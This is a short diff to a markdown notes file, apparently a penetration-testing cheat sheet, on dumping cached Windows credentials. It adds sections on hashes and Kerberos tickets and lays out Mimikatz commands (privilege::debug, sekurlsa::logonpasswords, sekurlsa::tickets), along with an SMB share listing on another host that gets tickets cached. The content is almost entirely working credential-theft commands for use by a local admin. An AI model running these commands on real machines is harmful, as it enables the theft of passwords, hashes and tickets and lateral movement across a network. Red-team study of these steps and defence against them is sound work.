@@ -2,14 +2,25 @@
 
 ## Cached creds
 
+### Hashes
+
 https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
 
-With the `SeDebugPrivilege` privilege:
+With the `SeDebugPrivilege` privilege (works with __local admins__):
 ```
 PS > .\mimikatz.exe
 m $ privelege::debug
 m $ sekurlsa::logonpasswords
+```
+
+### Tickets
+
+In another terminal:
+```
 PS2 > dir \\some_other_host\smb\some_share # in another terminal
+```
+and back in Mimikatz:
+```
 m $ sekurlsa::tickets
 ```
 
